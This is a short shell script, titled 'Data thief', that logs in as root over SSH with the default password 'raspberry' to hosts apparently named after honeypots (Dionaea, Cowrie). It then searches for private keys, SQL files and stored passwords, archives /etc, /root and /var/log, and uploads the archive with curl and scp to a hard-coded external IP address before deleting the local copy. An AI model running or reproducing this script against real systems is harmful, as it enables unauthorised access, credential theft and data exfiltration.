# Data thief: hunt secrets, archive, push out over curl/scp.
sshpass -p raspberry ssh -p "$SSH_P" root@"$DIONAEA" true 2>/dev/null
sshpass -p raspberry ssh -p "$SSH_P" root@"$COWRIE" "
  find / -name \"*.sql\" -o -name \"*.pem\" -o -name id_rsa 2>/dev/null;
  grep -r password /etc 2>/dev/null | head;
  tar czf /tmp/loot.tgz /etc /root /var/log 2>/dev/null;
  curl -T /tmp/loot.tgz http://185.220.101.5/upload/loot.tgz;
  scp /tmp/loot.tgz exfil@185.220.101.5:/data/; rm -f /tmp/loot.tgz" 2>/dev/null
